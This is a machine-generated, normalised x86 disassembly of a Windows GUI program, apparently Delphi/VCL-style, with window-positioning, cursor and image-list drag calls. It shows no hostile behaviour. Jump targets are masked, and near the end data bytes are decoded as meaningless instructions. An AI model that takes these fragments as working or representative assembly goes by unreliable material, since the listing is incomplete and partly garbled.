mov edx 0xb03d
call sub_472314
sub_471078
cmp dx [ eax + 0x78 ]
je r-xdata
retn
mov [ eax + 0x78 ] dx
push 0x0
xor ecx ecx
mov edx 0xb00f
call sub_472314
sub_471094
push ebx
mov ebx eax
call sub_46d884
cmp ebx eax
sete al
pop ebx
retn
sub_4710cc
push esi
mov dl 0x1
mov si 0xffcf
call sub_40587c
pop esi
retn
sub_4710dc
push esi
xor edx edx
mov si 0xffcf
call sub_40587c
pop esi
retn
sub_47126a
jmp sub_405fd0
sub_471271
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_471398
test [ eax + 0x50 ] 0x40
setne cl
movzx edx [ eax + 0x59 ]
call sub_471304
retn
sub_471460
xor edx edx
call sub_470d70
retn
sub_471498
mov edx [ eax + 0x34 ]
test edx edx
je r-xdata
retn
mov eax edx
mov edx [ eax ]
call [ edx + 0x9c ]
sub_4714ac
mov edx [ eax ]
call [ edx + 0x94 ]
retn
sub_471591
jmp sub_405fd0
sub_4715b4
xor eax eax
retn
sub_4715b8
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x61 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_4715d0
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x61 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_4715e8
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x61 ] 0x1
je r-xdata
mov al 0x1
retn
sub_471600
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
movzx eax [ eax + 0x61 ]
dec eax
sub al 0x2
jb r-xdata
mov al 0x1
retn
sub_47161c
mov edx [ rw-data ]
mov ecx [ edx + 0x8 ]
mov edx [ rw-data ]
movzx edx [ edx + 0x4 ]
call sub_471638
retn
sub_47174c
retn
sub_471750
cmp eax [ rw-data ]
sete al
retn
sub_4717c4
push ebx
cmp [ eax + 0x102 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x104 ]
call [ ebx + 0x100 ]
sub_4717e4
mov [ ecx ] 0x0
retn
sub_4717e8
push ebx
push esi
mov esi ecx
mov ebx [ eax + 0xac ]
movzx ecx [ ebx + 0x10 ]
mov [ edx ] cl
movzx eax [ ebx + 0x11 ]
mov [ esi ] al
pop esi
pop ebx
retn
sub_471904
push ebp
mov ebp esp
push esi
mov esi edx
mov edx esi
mov si 0xffd2
call sub_40587c
pop esi
pop ebp
retn 0x4
sub_471c33
jmp sub_405fd0
sub_471c3a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_471c44
push esi
xor ecx ecx
mov si 0xffea
call sub_40587c
pop esi
retn
sub_471c54
push esi
mov cl 0x1
mov si 0xffea
call sub_40587c
pop esi
retn
sub_471f2a
jmp sub_405fd0
sub_472083
jmp sub_405fd0
sub_4720d4
push esi
mov si 0xffef
call sub_40587c
pop esi
retn
sub_4720e0
mov al 0x1
retn
sub_472348
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
call sub_472314
pop ebx
pop ebp
retn 0x4
sub_47235c
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
call sub_472314
pop ebx
pop ebp
retn 0x4
sub_47243c
retn
sub_4727b5
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov eax esi
call sub_435d7c
mov [ ebx + 0x60 ] al
pop esi
pop ebx
retn
sub_4727d0
movzx eax [ eax + 0x60 ]
xchg edx eax
call sub_438a98
retn
sub_472c88
push ebx
cmp [ eax + 0x11a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x11c ]
call [ ebx + 0x118 ]
sub_472e36
add [ eax ] al
mov eax [ eax + 0x7c ]
retn
sub_4732e8
mov edx [ eax ]
call [ edx + 0x90 ]
retn
sub_4732f4
mov edx [ eax ]
call [ edx + 0x90 ]
retn
sub_473300
mov edx [ eax ]
call [ edx + 0x90 ]
retn
sub_473488
mov ecx [ rw-data ]
cmp [ ecx + 0xd ] 0x0
je r-xdata
retn
cmp [ edx + 0x4 ] 0x0
jne r-xdata
mov edx [ eax ]
call [ edx + 0x90 ]
sub_473510
push ebx
mov ebx eax
cmp [ ebx + 0x58 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x80 ]
mov eax ebx
call sub_470f4c
mov [ ebx + 0x58 ] 0x1
sub_473534
mov [ edx + 0xc ] 0x1
retn
sub_473604
xor eax eax
mov [ edx + 0xc ] eax
retn
sub_4736c0
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_481778
mov [ ebx + 0xac ] eax
pop ebx
retn
sub_4738b4
jmp sub_405fd0
sub_4738bb
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4738e8
mov eax [ r-xdata ]
retn
sub_473a65
jmp sub_405fd0
sub_473a6c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_473b90
mov eax [ eax + 0xa8 ]
retn
sub_473bf8
push ebx
mov ebx eax
mov eax ebx
call sub_4715d0
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax 0x20000
pop ebx
retn
sub_473c14
mov edx [ eax + 0x68 ]
test edx edx
je r-xdata
retn
mov eax edx
mov edx [ eax ]
call [ edx + 0x1c ]
sub_473dc8
mov eax [ eax + 0x70 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_473ed4
jmp sub_405fd0
sub_473edb
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_473fe4
jmp sub_405fd0
sub_473feb
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_474018
push esi
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x68 ]
pop esi
retn
sub_474024
mov eax [ eax + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_474030
mov eax [ eax + 0xac ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_47403c
test [ eax + 0x52 ] 0x10
setne al
retn
sub_4740a4
mov eax [ eax + 0x198 ]
xchg edx eax
call sub_439310
retn
sub_4740b4
mov eax [ eax + 0x1a0 ]
xchg edx eax
call sub_439310
retn
sub_4740c4
mov eax [ eax + 0x194 ]
xchg edx eax
call sub_439310
retn
sub_4740d4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_4369bc
mov [ ebx + 0x19c ] eax
pop esi
pop ebx
retn
sub_4740ec
mov eax [ eax + 0x19c ]
xchg edx eax
call sub_439310
retn
sub_4740fc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_4369bc
mov [ ebx + 0x198 ] eax
pop esi
pop ebx
retn
sub_474114
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_4369bc
mov [ ebx + 0x1a0 ] eax
pop esi
pop ebx
retn
sub_47412c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_4369bc
mov [ ebx + 0x194 ] eax
pop esi
pop ebx
retn
sub_474168
mov edx [ eax ]
call [ edx + 0x34 ]
retn
sub_474170
call sub_46fa5c
retn
sub_4742a9
jmp sub_405fd0
sub_474520
jmp sub_405fd0
sub_474570
jmp sub_405fd0
sub_474ede
jmp sub_405fd0
sub_474f72
jmp sub_405fd0
sub_474f96
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add eax 0x1a8
mov edx [ eax ]
xor ecx ecx
mov [ eax ] ecx
mov eax edx
call sub_4055f0
retn
sub_474faf
jmp sub_405fd0
j_sub_474f96
jmp sub_474f96
sub_475007
jmp sub_405fd0
sub_47500e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_475031
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_408928
retn
sub_47502a
jmp sub_405fd0
sub_475031
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_475249
jmp sub_405fd0
sub_4752b8
jmp sub_405fd0
sub_475366
jmp sub_405fd0
sub_475374
inc [ eax + 0x1ac ]
retn
sub_47537c
dec [ eax + 0x1ac ]
cmp [ eax + 0x1ac ] 0x0
jne r-xdata
retn
test [ eax + 0x54 ] 0x10
je r-xdata
call sub_47539c
sub_47539c
xor edx edx
call sub_4752e0
retn
sub_475469
jmp sub_405fd0
sub_475470
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_475568
jmp sub_405fd0
sub_475aab
jmp sub_405fd0
sub_475ab2
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_475cb2
jmp sub_405fd0
sub_475cb9
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_475d94
mov ecx [ eax ]
cmp ecx [ edx ]
jne r-xdata
xor eax eax
retn
mov eax [ eax + 0x4 ]
cmp eax [ edx + 0x4 ]
je r-xdata
mov al 0x1
retn
sub_475fc2
jmp sub_405fd0
sub_475fc9
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x258 ] edx
pop ecx
pop ebp
retn
sub_4761e4
cmp [ eax + 0x258 ] 0x0
je r-xdata
retn
push 0x0
xor ecx ecx
mov edx 0xb033
call sub_472314
sub_476258
jmp sub_405fd0
sub_4763b2
jmp sub_405fd0
sub_4763c3
jmp sub_405d1c
sub_47646c
jmp sub_405fd0
sub_4764b0
cmp dl [ eax + 0x1ee ]
je r-xdata
retn
mov [ eax + 0x1ee ] dl
cmp [ eax + 0x34 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb050
call sub_472314
sub_4765b5
jmp sub_405fd0
sub_476607
jmp sub_405fd0
sub_47660e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_476618
jmp sub_405d1c
sub_47661d
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_4a0994
call sub_406174
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_476f0c
jmp sub_405fd0
sub_4771d2
jmp sub_405fd0
sub_47720f
jmp sub_405fd0
sub_477216
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_477406
jmp sub_405fd0
sub_477588
jmp sub_405fd0
sub_47758f
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_47762c
jmp sub_405fd0
sub_477633
push 0xfffffffe
push 0xfffffffe
mov eax [ ebp - 0x8 ]
push eax
call InflateRect
mov esp ebp
pop ebp
retn
sub_47787e
jmp sub_405fd0
sub_477885
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xffffff7f
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4779a9
jmp sub_405fd0
sub_4779d0
jmp sub_405fd0
sub_477ab3
jmp sub_405fd0
sub_477aec
jmp sub_405fd0
sub_477b40
push ebx
mov ebx eax
call sub_44b32c
push 0x0
xor ecx ecx
mov edx 0xb024
mov eax ebx
call sub_472314
pop ebx
retn
sub_477b5c
mov ecx [ edx + 0x8 ]
push ecx
mov ecx [ edx + 0x4 ]
mov edx 0xb025
call sub_472314
retn
sub_477b70
push 0x0
xor ecx ecx
mov edx 0xb026
call sub_472314
retn
sub_477b80
push 0x0
xor ecx ecx
mov edx 0xb027
call sub_472314
retn
sub_477eb8
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_47a06c
mov eax esi
call sub_474070
pop esi
retn
sub_477fdc
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_47811c
xor edx edx
mov eax esi
call sub_47b990
pop esi
retn
sub_477ff8
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_47820c
mov dl 0x1
mov eax esi
call sub_47b990
pop esi
retn
sub_478014
push esi
mov esi eax
mov [ esi + 0x261 ] 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_478080
push esi
mov esi eax
mov [ esi + 0x261 ] 0x0
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_47810e
jmp sub_405fd0
sub_4781fc
jmp sub_405fd0
sub_478203
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_478296
jmp sub_405fd0
sub_47829d
pop ebx
pop ecx
pop ebp
retn
sub_4782a4
xchg edx eax
mov ecx [ eax ]
call [ ecx + 0x78 ]
retn
sub_4782ac
retn
sub_4782b0
push ebx
cmp [ eax + 0x202 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x204 ]
call [ ebx + 0x200 ]
sub_4782d0
push ebx
cmp [ eax + 0x20a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x20c ]
call [ ebx + 0x208 ]
sub_47843c
mov edx [ eax + 0x1c4 ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x8 ]
retn
sub_47850c
retn
sub_478658
jmp sub_405fd0
sub_47865f
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_478668
cmp dl [ eax + 0x260 ]
je r-xdata
retn
mov [ eax + 0x260 ] dl
mov [ eax + 0x1ee ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb04f
call sub_472314
sub_478751
jmp sub_405fd0
sub_47877c
xor ecx ecx
mov [ edx + 0xc ] ecx
cmp [ eax + 0x1eb ] 0x0
je r-xdata
retn
cmp [ eax + 0x1c8 ] 0x0
je r-xdata
mov edx [ edx + 0x8 ]
mov eax [ eax + 0x1c8 ]
mov ecx [ eax ]
call [ ecx + 0x28 ]
sub_47880b
jmp sub_405fd0
sub_478a3c
push ebx
cmp [ eax + 0x222 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x224 ]
call [ ebx + 0x220 ]
sub_478d1c
add [ eax ] al
add [ eax ] al
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor eax eax
mov [ esi + 0x258 ] eax
mov [ esi + 0x1ea ] 0x0
pop esi
retn
sub_478dfc
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov dx 0xb023
mov eax esi
call sub_475914
pop esi
retn
sub_478ef4
push esi
mov si 0xffc0
call sub_40587c
pop esi
retn
sub_478f20
push ebx
mov ecx [ eax + 0x34 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_478f34
push ebx
mov ecx [ eax + 0x34 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_478f48
call sub_4758a4
retn
sub_478f50
call sub_4758a4
retn
sub_478f58
call sub_4758a4
retn
sub_478f90
movzx edx [ eax + 0x1ea ]
movzx edx [ edx * 2 + rw-data ]
push edx
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ eax + 0x258 ]
push eax
call SetWindowPos
retn
sub_479000
push ebx
mov ebx eax
mov eax ebx
call sub_473300
mov edx [ ebx + 0x6c ]
mov eax [ ebx + 0x1c0 ]
call sub_44cd1c
mov dx 0xb009
mov eax ebx
call sub_475914
pop ebx
retn
sub_479190
call sub_4758a4
retn
sub_479198
call sub_4758a4
retn
sub_4791a0
call sub_4758a4
retn
sub_4791a8
push ebx
mov ebx eax
mov dx 0xb058
mov eax ebx
call sub_475914
mov eax ebx
mov edx [ eax ]
call [ edx + 0x90 ]
pop ebx
retn
sub_4791c4
call sub_4758a4
retn
sub_47922c
push ebx
mov ecx [ eax + 0x34 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_479240
push ebx
mov ecx [ eax + 0x34 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_479774
jmp sub_405fd0
sub_47977b
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_479ab4
push 0x0
xor ecx ecx
mov edx 0xb034
call sub_472314
retn
sub_479bac
push ebx
mov ebx eax
mov eax ebx
call sub_47a060
test al al
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x258 ]
push eax
call UpdateWindow
sub_479bc8
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x90 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x9c ]
pop ebx
retn
sub_479e48
push ebx
push esi
mov esi edx
mov ebx eax
push esi
mov eax ebx
call sub_479ce0
push eax
call GetClientRect
pop esi
pop ebx
retn
sub_479e9c
cmp edx [ eax + 0x1b8 ]
je r-xdata
retn
mov [ eax + 0x1b8 ] edx
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_472314
sub_479ebc
cmp dl [ eax + 0x1e9 ]
je r-xdata
retn
mov [ eax + 0x1e9 ] dl
mov [ eax + 0x1ed ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb010
call sub_472314
sub_479ee0
movzx eax [ eax + 0x1ed ]
xor al 0x1
retn
sub_479eec
movzx eax [ eax + 0x1ee ]
xor al 0x1
retn
sub_479f78
test [ eax + 0x54 ] 0x8
je r-xdata
call sub_479f1c
retn
movsx edx dx
mov [ eax + 0x1e4 ] edx
retn
sub_47a054
jmp sub_405fd0
sub_47a05b
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_47a2de
jmp sub_405fd0
sub_47a2e5
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_47a3ac
call sub_4720e4
retn
sub_47a8e9
jmp sub_405fd0
sub_47a980
mov eax [ r-xdata ]
retn
sub_47aae2
jmp sub_405fd0
sub_47aebb
jmp sub_405fd0
sub_47b0ee
jmp sub_405fd0
sub_47b12b
jmp sub_405fd0
sub_47b132
mov esp ebp
pop ebp
retn
sub_47b4c0
jmp sub_405fd0
sub_47b881
jmp sub_405fd0
sub_47b888
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47b978
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor edx edx
mov eax esi
call sub_47b990
pop esi
retn
sub_47b9c4
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0xc
sub_47b9d0
xor eax eax
retn
sub_47ba28
xor edx edx
call sub_4752e0
retn
sub_47ba30
mov eax [ eax + 0x1bc ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_47bb78
jmp sub_405fd0
sub_47bb7f
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_47bc50
mov [ edx + 0xc ] 0xffffffff
retn
sub_47bcae
jmp sub_405fd0
sub_47bcb5
pop ecx
pop ecx
pop ebp
retn
sub_47bdd1
jmp sub_405fd0
sub_47bdd8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47be44
mov edx [ eax ]
call [ edx + 0xc0 ]
retn
sub_47bedb
jmp sub_405fd0
sub_47bee2
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_47c183
jmp sub_405fd0
sub_47c18a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47c1a7
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
sub_47c1a0
jmp sub_405fd0
sub_47c1a7
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47c2c4
mov al 0x1
retn
sub_47c308
push ebx
mov ebx eax
mov eax ebx
call sub_488b4c
or edx 0xffffffff
mov eax ebx
call sub_47c370
pop ebx
retn
sub_47c370
cmp dx [ eax + 0x78 ]
je r-xdata
retn
mov ecx edx
mov [ eax + 0x78 ] cx
cmp [ eax + 0x7a ] 0x0
je r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov eax ecx
xchg edx eax
call sub_49daf0
sub_47c50c
push ebx
mov ebx eax
mov eax ebx
call sub_488c08
test al al
je r-xdata
pop ebx
retn
push 0xffffffff
call ImageList_DragShowNolock
sub_47c524
push ebx
mov ebx eax
mov eax ebx
call sub_488c08
test al al
je r-xdata
pop ebx
retn
push 0x0
call ImageList_DragShowNolock
sub_47c61c
push ebx
push esi
mov esi edx
mov ebx eax
or [ ebx + 0x54 ] 0x100
mov edx esi
mov eax ebx
call sub_47789c
and [ ebx + 0x54 ] 0xfffffeff
pop esi
pop ebx
retn
sub_47c6b7
jmp sub_405fd0
sub_47c6be
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47c6e1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
call sub_44d038
retn
sub_47c6da
jmp sub_405fd0
sub_47c6e1
pop ebx
pop ecx
pop ebp
retn
sub_47c6e8
retn
sub_47c768
xor edx edx
mov eax [ eax + 0x8 ]
test eax eax
je r-xdata
mov eax edx
retn
mov eax [ eax + 0xc ]
inc edx
test eax eax
jne r-xdata
sub_47cb05
jmp sub_405fd0
sub_47ccec
mov [ eax + 0x20 ] edx
retn
sub_47ccf0
mov eax [ eax + 0x8 ]
jmp r-xdata
mov edx [ eax + 0xc ]
test edx edx
jne r-xdata
mov eax edx
retn
sub_47cedd
jmp sub_405fd0
sub_47cf90
mov eax [ eax + 0x14 ]
movzx eax [ eax + 0x5d ]
dec eax
sub al 0x2
jae r-xdata
add [ ecx + 0x4 ] 0xc
retn
add [ ecx ] 0xc
retn
sub_47cfa8
inc [ eax + 0x6c ]
retn
sub_47cfac
dec [ eax + 0x6c ]
cmp [ eax + 0x6c ] 0x0
jg r-xdata
retn
xor edx edx
mov [ eax + 0x6c ] edx
call sub_47ec2c
sub_47d110
call sub_47d800
test eax eax
je r-xdata
xor eax eax
retn
mov eax [ eax + 0x4 ]
retn
sub_47d92e
jmp sub_405fd0
sub_47d935
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47dc5a
jmp sub_405fd0
sub_47dc61
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47dc86
lea eax [ ebp - 0x44 ]
call j_sub_4068a0
lea eax [ ebp - 0x8 ]
call j_sub_4068a0
retn
sub_47dc7f
jmp sub_405fd0
sub_47dc86
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47e04a
jmp sub_405fd0
sub_47e051
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47e06e
mov eax [ ebp - 0x4 ]
call sub_44d038
retn
sub_47e067
jmp sub_405fd0
sub_47e06e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47e08b
mov eax [ ebp - 0x4 ]
call sub_4055f0
retn
sub_47e084
jmp sub_405fd0
sub_47e08b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47e572
jmp sub_405fd0
sub_47e579
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47e74c
jmp sub_405fd0
sub_47e753
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_47e85f
jmp sub_405fd0
sub_47e866
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47e9b9
jmp sub_405fd0
sub_47ea4e
jmp sub_405fd0
sub_47ea55
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47eb0c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_47d018
mov [ ebx + 0x38 ] eax
pop esi
pop ebx
retn
sub_47ec54
cmp [ eax + 0x6c ] 0x0
jne r-xdata
retn
mov eax edx
call sub_47cb48
sub_47ec64
push esi
push edi
mov edi edx
mov esi eax
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop edi
pop esi
retn
sub_47f400
cmp dl 0x1
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_49e85c
call sub_49d0a8
retn
mov eax [ rw-data ]
mov eax [ eax ]
call sub_49e85c
call sub_49d0dc
retn
sub_47f7bf
jmp sub_405fd0
sub_47f7c6
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_47f8bc
call GetCapture
retn
sub_47f8f0
cmp [ rw-data ] 0x0
setne al
retn
sub_47f920
push ebx
mov ebx eax
push 0x13
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb eax eax
inc eax
mov [ ebx + 0xc ] al
pop ebx
retn
sub_47f9bc
mov eax [ edx + 0x4 ]
push eax
mov eax [ edx ]
push eax
call SetCursorPos
retn
sub_47fbbe
jmp sub_405fd0
sub_47fe8c
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
retn
push eax
call [ rw-data ]
retn
sub_4800cb
jmp sub_405fd0
sub_4800d2
pop ebx
mov esp ebp
pop ebp
retn
sub_480350
push ebx
cmp [ eax + 0x1a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
sub_480364
mov [ edx + 0x8 ] 0x3
mov [ edx + 0x10 ] 0x3
mov [ edx + 0xc ] 0x3
mov [ edx + 0x14 ] 0x3
retn
sub_4804b6
jmp sub_405fd0
sub_4806b8
retn
sub_4806bc
mov edx eax
mov eax [ eax + 0x278 ]
mov ecx [ eax ]
call [ ecx + 0x3c ]
retn
sub_4806cc
call sub_47b978
retn
sub_480758
push ebx
mov ebx edx
mov edx ebx
call sub_4759a4
mov [ ebx + 0x4 ] 0x80000000
mov [ ebx + 0x8 ] 0x88
pop ebx
retn
sub_4807cc
push ebx
push esi
mov esi eax
mov ecx edx
mov eax [ esi + 0x278 ]
mov edx esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
pop esi
pop ebx
retn
sub_4807e4
mov edx eax
mov eax [ eax + 0x278 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
retn
sub_4807f4
push ebx
add esp 0xfffffff8
mov ebx eax
push esp
call GetCursorPos
mov edx esp
mov eax ebx
call sub_4808b4
pop ecx
pop edx
pop ebx
retn
sub_4808f0
mov [ edx + 0xc ] 0xffffffff
retn
sub_48094e
jmp sub_405fd0
sub_480955
pop ecx
pop ecx
pop ebp
retn
sub_480acc
cmp edx [ eax + 0x3c ]
je r-xdata
retn
mov ecx edx
mov [ eax + 0x3c ] ecx
test ecx ecx
je r-xdata
mov edx eax
mov eax ecx
call sub_43c22c
sub_480b88
cmp edx [ eax + 0x58 ]
jne r-xdata
retn
call sub_480b94
sub_480b94
mov [ eax + 0x50 ] 0x0
retn
sub_480b9c
retn
sub_480e01
jmp sub_405fd0
sub_480e08
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_480e18
mov [ eax + 0x50 ] 0x1
retn
sub_480f5d
jmp sub_405fd0
sub_480f64
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_481050
add esp 0xfffffff8
xor edx edx
mov [ esp ] edx
xor edx edx
mov [ esp + 0x4 ] edx
mov edx esp
call sub_481014
pop ecx
pop edx
retn
sub_481179
jmp sub_405fd0
sub_48126e
jmp sub_405fd0
sub_4812b8
jmp sub_405fd0
sub_4812bf
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_481425
jmp sub_405fd0
sub_4814f1
jmp sub_405fd0
sub_4815ee
jmp sub_405fd0
sub_481675
jmp sub_405fd0
sub_4816f6
jmp sub_405fd0
sub_4816fd
retn
sub_4816fe
jmp sub_405fd0
sub_481754
mov [ eax + 0x48 ] 0x1
retn
sub_48175c
mov eax [ eax + 0x40 ]
call sub_430fb8
retn
sub_481768
mov eax [ eax + 0x50 ]
call sub_43f378
retn
sub_481774
xor eax eax
retn
sub_481894
test edx edx
je r-xdata
retn
mov eax [ eax + 0x14 ]
call sub_4303e0
sub_48194c
push esi
mov dl 0x1
mov eax [ eax + 0x4 ]
mov si 0xffd7
call sub_40587c
pop esi
retn
sub_481960
push esi
xor edx edx
mov eax [ eax + 0x4 ]
mov si 0xffd7
call sub_40587c
pop esi
retn
sub_481974
push esi
mov dl 0x2
mov eax [ eax + 0x4 ]
mov si 0xffd7
call sub_40587c
pop esi
retn
sub_481988
push esi
mov dl 0x3
mov eax [ eax + 0x4 ]
mov si 0xffd7
call sub_40587c
pop esi
retn
sub_481bcb
jmp sub_405fd0
sub_481bd2
pop ebp
retn
sub_484a22
out dx al
dec ebx
dec eax
add [ edx ] al
hlt
sub_484a2b
dec esp
dec eax
add [ edx ] al
hlt
sub_484a49
push [ ebp + 0x4200484d ]
add ah dh
jmp [ edx ]
sub_484ad3
push esp
dec eax
add [ edx ] al
hlt
sub_484ad9
push [ ebp + 0x54 ]
dec eax
add [ edx ] al
hlt
sub_484b23
push edi
dec eax
add [ edx ] al
hlt
sub_484b59
push [ ecx + ebx * 2 ]
dec eax
add [ edx ] al
hlt
sub_485d9c
push ebx
cmp [ eax + 0x6a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x6c ]
call [ ebx + 0x68 ]
sub_485de0
push ebx
mov ebx eax
mov eax ebx
call sub_48732c
mov eax ebx
mov edx [ eax ]
call [ edx ]
